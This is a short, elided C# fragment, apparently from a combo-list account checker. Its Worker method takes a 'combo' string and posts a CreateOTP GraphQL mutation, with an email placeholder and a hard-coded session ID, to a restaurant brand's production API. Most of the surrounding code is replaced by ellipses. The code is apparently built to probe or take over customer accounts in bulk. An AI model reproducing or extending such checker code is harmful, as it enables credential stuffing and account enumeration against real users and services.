        ...
        static void Worker(string combo)
        {
            try
            {
                ...
                })
                {
                    ...
                    string check = req.Post("https://prod-bk.rbictg.com/graphql", "[{\"operationName\":\"CreateOTP\",\"variables\":{\"input\":{\"email\":\"<USER>\",\"platform\":\"web\",\"sessionId\":\"31712e32-bb88-474b-bce1-fa58428af81c\"}},\"query\":\"mutation CreateOTP($input: CreateOTPInput!) {\\n  createOTP(input: $input) {\\n    maxValidateAttempts\\n    ttl\\n    __typename\\n  }\\n}\\n\"}]", "application/json").ToString();
